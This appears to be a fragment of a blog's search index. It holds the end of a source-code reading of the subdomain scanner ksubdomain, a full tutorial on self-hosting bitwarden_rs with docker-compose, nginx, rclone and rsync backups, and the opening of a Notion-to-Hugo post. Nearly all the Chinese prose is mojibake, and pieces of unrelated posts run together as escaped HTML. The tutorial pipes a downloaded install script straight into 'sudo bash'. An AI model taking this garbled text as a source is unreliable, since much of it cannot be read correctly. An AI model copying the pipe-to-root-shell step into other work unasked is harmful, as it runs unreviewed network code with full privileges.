style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\u003cspan style=\"color:#a6e22e\"\u003eDomain\u003c/span\u003e:       \u003cspan style=\"color:#a6e22e\"\u003edomains\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\u003cspan style=\"color:#a6e22e\"\u003eFileName\u003c/span\u003e:     \u003cspan style=\"color:#a6e22e\"\u003ec\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eString\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;filename\u0026#34;\u003c/span\u003e),\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\u003cspan style=\"color:#a6e22e\"\u003eResolvers\u003c/span\u003e:    \u003cspan style=\"color:#a6e22e\"\u003eoptions\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eGetResolvers\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003ec\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eString\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;resolvers\u0026#34;\u003c/span\u003e)),\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\u003cspan style=\"color:#a6e22e\"\u003eOutput\u003c/span\u003e:       \u003cspan style=\"color:#a6e22e\"\u003ec\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eString\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;output\u0026#34;\u003c/span\u003e),\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\u003cspan style=\"color:#a6e22e\"\u003eSilent\u003c/span\u003e:       \u003cspan style=\"color:#a6e22e\"\u003ec\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eBool\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;silent\u0026#34;\u003c/span\u003e),\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\u003cspan style=\"color:#a6e22e\"\u003eStdin\u003c/span\u003e:        \u003cspan style=\"color:#a6e22e\"\u003ec\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eBool\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;stdin\u0026#34;\u003c/span\u003e),\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\u003cspan style=\"color:#a6e22e\"\u003eSkipWildCard\u003c/span\u003e: \u003cspan style=\"color:#a6e22e\"\u003ec\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eBool\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;skip-wild\u0026#34;\u003c/span\u003e),\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\u003cspan style=\"color:#a6e22e\"\u003eTimeOut\u003c/span\u003e:      \u003cspan style=\"color:#a6e22e\"\u003ec\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eInt\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;timeout\u0026#34;\u003c/span\u003e),\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\u003cspan style=\"color:#a6e22e\"\u003eRetry\u003c/span\u003e:        \u003cspan style=\"color:#a6e22e\"\u003ec\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eInt\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;retry\u0026#34;\u003c/span\u003e),\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\u003cspan style=\"color:#a6e22e\"\u003eMethod\u003c/span\u003e:       \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;enum\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\u003cspan style=\"color:#a6e22e\"\u003eOnlyDomain\u003c/span\u003e:   \u003cspan style=\"color:#a6e22e\"\u003ec\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eBool\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;only-domain\u0026#34;\u003c/span\u003e),\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\u003cspan style=\"color:#a6e22e\"\u003eNotPrint\u003c/span\u003e:     \u003cspan style=\"color:#a6e22e\"\u003ec\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eBool\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;not-print\u0026#34;\u003c/span\u003e),\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\u003cspan style=\"color:#a6e22e\"\u003eLevel\u003c/span\u003e:        \u003cspan style=\"color:#a6e22e\"\u003ec\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eInt\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;level\u0026#34;\u003c/span\u003e),\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\u003cspan style=\"color:#a6e22e\"\u003eLevelDomains\u003c/span\u003e: \u003cspan style=\"color:#a6e22e\"\u003elevelDomains\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\u003cspan style=\"color:#a6e22e\"\u003eopt\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eCheck\u003c/span\u003e()\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\u003cspan style=\"color:#a6e22e\"\u003er\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003eerr\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e:=\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003erunner\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eNew\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003eopt\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eerr\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e!=\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003enil\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\u003cspan style=\"color:#a6e22e\"\u003egologger\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eFatalf\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;%s\\n\u0026#34;\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003eerr\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eError\u003c/span\u003e())\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003enil\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\u003cspan style=\"color:#a6e22e\"\u003er\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eRunEnumeration\u003c/span\u003e()\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\u003cspan style=\"color:#a6e22e\"\u003er\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eClose\u003c/span\u003e()\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003enil\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t},\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/td\u003e\u003c/tr\u003e\u003c/table\u003e\n\u003c/div\u003e\n\u003c/div\u003e\u003cp\u003eå…·ä½“çš„å®ç°ç»†èŠ‚å°±ä¸å…³æ³¨äº†ï¼Œå¯ä»¥çœ‹åˆ°å…¥å£ç‚¹åªæ˜¯è¯»å–äº†ä¸€äº›é…ç½®ï¼Œç»§ç»­è¿›å…¥ \u003ccode\u003eRunEnumeration\u003c/code\u003e çœ‹çœ‹\u003c/p\u003e","title":"ksubdomainæºç é˜…è¯»"},{"content":"å› ä¸ºbitwardençš„æ°ªé‡‘ç©å®¶æ‰èƒ½ä½¿ç”¨åŒå› å­è®¤è¯ï¼Œæ°å¥½æ‰‹ä¸Šæœ‰ä¸ªvpsï¼Œæ­å»ºä¸ªbitwardenæœåŠ¡ç«¯æ¥ä½¿ç”¨2fa\nè‡ªå»ºbitwarden vpsæ¯”è¾ƒåƒåœ¾ï¼Œæ‰€ä»¥é€‰ç”¨ä¸€ä¸ªèµ„æºå¼€é”€æ¯”è¾ƒå°çš„æœåŠ¡ç«¯æ¯”è¾ƒæœ‰å¿…è¦ï¼Œæˆ‘è¿™é‡Œé€‰æ‹©çš„æ˜¯ https://github.com/mprasil/bitwarden_rs\nè¿™é‡Œé‡‡ç”¨ docker-compose è¿›è¡Œéƒ¨ç½²\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 version: \u0026#39;3\u0026#39; services: bitwarden: image: bitwardenrs/server:latest container_name: bitwarden restart: unless-stopped volumes: - ./bw-data:/data environment: - WEBSOCKET_ENABLED=true - SIGNUPS_ALLOWED=true - WEB_VAULT_ENABLED=true - ADMIN_TOKEN=xxxxxxxxxxxxxxxxxxxx ports: - \u0026#34;127.0.0.1:8889:80\u0026#34; - \u0026#34;127.0.0.1:8810:3012\u0026#34; å…¶ä¸­çš„3012æ˜¯websocketé€šçŸ¥ç«¯å£\nWEBSOCKET_ENABLED ä»£è¡¨å¯ç”¨ websocket\nSIGNUPS_ALLOWED ä»£è¡¨æ˜¯å¦å¯ç”¨æ³¨å†Œ\nWEB_VAULT_ENABLED ä»£è¡¨æ˜¯å¦å¯ç”¨webç•Œé¢\nADMIN_TOKEN æ˜¯ç®¡ç†ç•Œé¢çš„å¯†ç ï¼Œç”¨æ¥å¯ç”¨ç®¡ç†ç•Œé¢ï¼Œå¯ç”¨åå¯é€šè¿‡ [https://ä½ çš„åŸŸå/admin](https://ä½ çš„åŸŸå/admin) è¿›è¡Œè®¿é—®\nç„¶åæˆ‘ä»¬éœ€è¦åˆ›å»ºä¸€ä¸ªåå‘ä»£ç†ï¼Œè¿™é‡Œæˆ‘ä½¿ç”¨çš„æ˜¯ nginxï¼Œä¸‹é¢ç»™å‡º nginx é…ç½®\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 upstream bitwarden-default { server 127.0.0.1:8889; } upstream bitwarden-ws { server 127.0.0.1:8810; } server { listen 80; listen [::]:80; server_name bitwarden.example.tld; client_max_body_size 128M; # reverse proxy location / { proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_set_header X-Forwarded-Proto $scheme; proxy_pass http://bitwarden-default; } location /notifications/hub/negotiate { proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_set_header X-Forwarded-Proto $scheme; proxy_pass http://bitwarden-default; } location /notifications/hub { proxy_set_header Upgrade $http_upgrade; proxy_set_header Connection $http_connection; proxy_set_header X-Real-IP $remote_addr; proxy_pass http://bitwarden-ws; } } ä½ ç°åœ¨å¯ä»¥è®¿é—®åŸŸåçœ‹çœ‹ç•Œé¢äº†\nå½“ç„¶ï¼Œç°åœ¨è¿˜åªæ˜¯httpï¼Œhttpåè®®ä¸‹bitwardenæ˜¯ä¸å…è®¸è¿›è¡Œä¸€äº›å¯†ç æ“ä½œçš„ï¼Œä½ å¯ä»¥é…ç½®è¯ä¹¦æ¥å…¥sslï¼Œæˆ–è€…ä½¿ç”¨cloudflareæ¥å…¥ssl\næ³¨å†Œå®Œè‡ªå·±çš„ç”¨æˆ·åå»ºè®®ä¿®æ”¹ä¸Šé¢çš„ SIGNUPS_ALLOWED ç„¶åé‡å¯dockerå…³é—­æ³¨å†Œã€‚\nç„¶åä½ å¯ä»¥ä½¿ç”¨bitwardençš„å®¢æˆ·ç«¯äº†\nåˆ›å»ºæŒ‚è½½ç›®å½•å¤‡ä»½æ•°æ® å¯†ç æ•°æ®æœ€å¥½å¤‡ä»½ä¸€ä¸‹ï¼Œè¦æ˜¯å“ªå¤©vpsåäº†å°±ggäº†\nbitwarden_rsçš„æ•°æ®åº“æ˜¯sqlite3ï¼Œç›´æ¥æ‰“åŒ…å‹ç¼©å¤‡ä»½ï¼Œç„¶ååŒæ­¥åˆ°åšæœäº‘\nåšæœäº‘é…ç½®webdav é¦–å…ˆæˆ‘ä»¬åœ¨åšæœäº‘åç«¯åˆ›å»ºä¸€ä¸ªå¤‡ä»½åº”ç”¨ï¼Œç‚¹å‡»è¿›å…¥ è´¦æˆ·ä¿¡æ¯ - å®‰å…¨é€‰é¡¹\nç„¶åç‚¹å‡»ä¸‹é¢çš„æ·»åŠ åº”ç”¨ï¼Œéšä¾¿å¡«å†™ä¸€ä¸ªåå­—ï¼Œç„¶åå¤åˆ¶ç”Ÿæˆçš„åº”ç”¨å¯†ç \nç„¶ååœ¨åšæœäº‘æ ¹ç›®å½•ä¸‹åˆ›å»ºä¸€ä¸ªç›®å½•åä¸º bitwarden_backup ä½œä¸ºæˆ‘ä»¬åç»­çš„åŒæ­¥æ–‡ä»¶å¤¹\næœåŠ¡å™¨æŒ‚è½½webdav é¦–å…ˆå®‰è£…rcloneï¼Œä¸ºä»€ä¹ˆä½¿ç”¨rcloneè€Œä¸æ˜¯davfs2ï¼Œä¸»è¦æ˜¯å› ä¸ºdavfs2ä¸æ”¯æŒ vfs ç¼“å­˜ï¼ˆå°†ç›´æ¥ä»è¿œç¨‹è¯»å–å¹¶ç›´æ¥å†™å…¥è¿œç¨‹ï¼‰ï¼Œå¯¹äºåç»­çš„åŒæ­¥ä¼šæœ‰æ¯”è¾ƒå¤§çš„é—®é¢˜ï¼ˆä¸»è¦æ˜¯åŒæ­¥ç¨‹åºå¯¹äºæ–‡ä»¶çš„æ“ä½œï¼‰\n1 curl https://rclone.org/install.sh | sudo bash æŒ‚è½½éœ€è¦ä½¿ç”¨fuseï¼Œæ‰€ä»¥éœ€è¦å®‰è£…ä¸€ä¸‹\n1 apt install fuse ç„¶åä½¿ç”¨ rclone config é…ç½®webdav\nç„¶ååˆ›å»ºç›®å½•è¿›è¡ŒæŒ‚è½½\n1 2 3 4 5 6 7 8 mkdir /mnt/rclone_bitwarden_backup #æŒ‚è½½ #rclone mount \u0026lt;ç½‘ç›˜åç§°:ç½‘ç›˜è·¯å¾„\u0026gt; \u0026lt;æœ¬åœ°è·¯å¾„\u0026gt; [å‚æ•°] --daemon #å–æ¶ˆæŒ‚è½½ #fusermount -qzu \u0026lt;æœ¬åœ°è·¯å¾„\u0026gt; rclone mount jianguoyun:/bitwarden_backup /mnt/rclone_bitwarden_backup --allow-non-empty --daemon --vfs-cache-mode full --log-file /var/log/rclone_bitwarden_backup.lo ä¸Šé¢çš„æ˜¯æ‰‹åŠ¨æŒ‚è½½ï¼Œå¦‚æœä½ å¸Œæœ›å¼€æœºè‡ªåŠ¨æŒ‚è½½å¯ä»¥æŸ¥çœ‹ Rclone ä½¿ç”¨æ•™ç¨‹ - æŒ‚è½½ OneDriveã€Google Drive ç­‰ç½‘ç›˜(Linux)\nç›‘å¬æ–‡ä»¶å˜åŒ–è¿›è¡ŒåŒæ­¥ å…¶å®ä¹Ÿå¯ä»¥ç›´æ¥å°†ä¸Šé¢çš„ docker-compose æŒ‚è½½ç›®å½•è®¾ç½®åˆ°webdavçš„æŒ‚è½½ç›®å½•ä¸Šå»ï¼Œä½†æ˜¯icon_cacheè¿™ä¸ªç›®å½•ä¸‹å¾ˆå¤šæ–‡ä»¶ï¼Œè°ƒç”¨webdavæ¬¡æ•°è¿‡å¤šä¼šè§¦å‘åšæœäº‘é£æ§ï¼Œå¦‚æœä¸åœ¨æ„çš„è¯ä¹Ÿå¯ä»¥é‡‡å–è¯¥æ–¹æ¡ˆ\næˆ‘è¿™é‡Œé‡‡ç”¨ inotify è¿›è¡Œç›‘æ§åŒæ­¥çš„æ–¹æ¡ˆ\né¦–å…ˆå®‰è£… rsyncå’Œinotifywait\n1 apt install -y rsync inotify-tools ç„¶åç›‘æ§æ–‡ä»¶å˜æ›´ï¼ŒåŒæ­¥åˆ°webdavçš„æŒ‚è½½ç›®å½•\n1 inotifywait -mrq --timefmt \u0026#39;%d/%m/%y %H:%M\u0026#39; --format \u0026#39;%T %w %f %e\u0026#39; -e modify,create,delete,move /root/bitwarden_rs/bw-data | while read -r event; do rsync -aHv --exclude icon_cache /root/bitwarden_rs/bw-data/ /mnt/rclone_bitwarden_backup/; done æ³¨æ„è¯¥å‘½ä»¤æœ€å¥½ä½¿ç”¨tmuxä¹‹ç±»çš„ç¨‹åºæ¥å¯åŠ¨ï¼Œå› ä¸ºéœ€è¦è·‘åœ¨åå°\nåè®° å‘ç°ç›‘å¬å˜åŒ–å°±åŒæ­¥ï¼Œåšæœäº‘çš„ä¸Šä¼ æµé‡ç”¨å¾—å¤ªçŒ›äº†ï¼Œæ‰€ä»¥è¿˜æ˜¯é‡‡ç”¨äº†crontabå®šæ—¶åŒæ­¥çš„æ–¹æ¡ˆ\nå‚è€ƒé“¾æ¥ https://rs.bitwarden.in/configuration/enabling-websocket-notifications\nhttps://gythialy.github.io/deploy-bitwarden-rs-with-traefik/\nhttps://github.com/dani-garcia/vaultwarden/wiki/Proxy-examples\nhttps://pianshen.com/article/4173217148/\nhttps://p3terx.com/archives/linux-vps-uses-rclone-to-mount-network-drives-such-as-onedrive-and-google-drive.html\nhttps://rclone.org/commands/rclone_mount/#vfs-cache-mode-full\nhttps://www.myfreax.com/how-to-exclude-files-and-directories-with-rsync/\nhttps://segmentfault.com/a/1190000038351925\n","permalink":"https://www.hacktech.cn/post/selfhost-bitwarden-sync-nutstore.html","summary":"\u003cp\u003eå› ä¸ºbitwardençš„æ°ªé‡‘ç©å®¶æ‰èƒ½ä½¿ç”¨åŒå› å­è®¤è¯ï¼Œæ°å¥½æ‰‹ä¸Šæœ‰ä¸ªvpsï¼Œæ­å»ºä¸ªbitwardenæœåŠ¡ç«¯æ¥ä½¿ç”¨2fa\u003c/p\u003e\n\u003ch2 id=\"è‡ªå»ºbitwarden\"\u003eè‡ªå»ºbitwarden\u003c/h2\u003e\n\u003cp\u003evpsæ¯”è¾ƒåƒåœ¾ï¼Œæ‰€ä»¥é€‰ç”¨ä¸€ä¸ªèµ„æºå¼€é”€æ¯”è¾ƒå°çš„æœåŠ¡ç«¯æ¯”è¾ƒæœ‰å¿…è¦ï¼Œæˆ‘è¿™é‡Œé€‰æ‹©çš„æ˜¯ \u003ca href=\"https://github.com/mprasil/bitwarden_rs\"\u003ehttps://github.com/mprasil/bitwarden_rs\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003eè¿™é‡Œé‡‡ç”¨ docker-compose è¿›è¡Œéƒ¨ç½²\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cdiv style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\n\u003ctable style=\"border-spacing:0;padding:0;margin:0;border:0;\"\u003e\u003ctr\u003e\u003ctd style=\"vertical-align:top;padding:0;margin:0;border:0;\"\u003e\n\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e 1\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e 2\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e 3\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e 4\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e 5\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e 6\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e 7\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e 8\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e 9\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e10\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e11\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e12\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e13\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e14\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e15\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e16\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e17\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/td\u003e\n\u003ctd style=\"vertical-align:top;padding:0;margin:0;border:0;;width:100%\"\u003e\n\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-yaml\" data-lang=\"yaml\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003eversion\u003c/span\u003e: \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;3\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003eservices\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#f92672\"\u003ebitwarden\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003eimage\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003ebitwardenrs/server:latest\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003econtainer_name\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003ebitwarden\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003erestart\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003eunless-stopped\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003evolumes\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      - \u003cspan style=\"color:#ae81ff\"\u003e./bw-data:/data\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003eenvironment\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      - \u003cspan style=\"color:#ae81ff\"\u003eWEBSOCKET_ENABLED=true\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      - \u003cspan style=\"color:#ae81ff\"\u003eSIGNUPS_ALLOWED=true\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      - \u003cspan style=\"color:#ae81ff\"\u003eWEB_VAULT_ENABLED=true\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      - \u003cspan style=\"color:#ae81ff\"\u003eADMIN_TOKEN=xxxxxxxxxxxxxxxxxxxx\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003eports\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      - \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;127.0.0.1:8889:80\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      - \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;127.0.0.1:8810:3012\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/td\u003e\u003c/tr\u003e\u003c/table\u003e\n\u003c/div\u003e\n\u003c/div\u003e\u003cp\u003eå…¶ä¸­çš„3012æ˜¯websocketé€šçŸ¥ç«¯å£\u003c/p\u003e","title":"è‡ªå»ºbitwardenå¤‡ä»½åŒæ­¥åˆ°åšæœäº‘"},{"content":"notionæ˜¯ç”¨æ¥è®°å½•ç¬”è®°çš„ï¼Œhugoæ˜¯æˆ‘ç”¨æ¥ä½œä¸ºgithubåšå®¢è‡ªåŠ¨æ„å»ºå‘å¸ƒçš„\næˆ‘ç›®å‰è®¾ç½®äº†ä¸€ä¸ªgithub actionæ˜¯ï¼šå½“æˆ‘çš„åšå®¢ä»“åº“hugoåˆ†æ”¯æœ‰pushäº‹ä»¶æ—¶ï¼Œè‡ªåŠ¨æ„å»ºæ–‡ç« å‘å¸ƒåˆ°masteråˆ†æ”¯ï¼Œå¹¶ä¸”å‘å¸ƒåˆ°åšå®¢å›­ã€‚\nä½†æ˜¯ä¼šæœ‰è¿™æ ·çš„ä¸ä¾¿ï¼šåœ¨notionä¸­å†™äº†ä¸€ç¯‡ç¬”è®°æˆ–æ–‡ç« ï¼Œæƒ³è¦å‘å¸ƒåˆ°githubé™æ€åšå®¢ä¸Šï¼Œå‘ç°éœ€è¦å…ˆå°†æ–‡ç« è½¬åŒ–æˆmarkdownï¼Œå›¾ç‰‡éœ€è¦ä¸Šä¼ 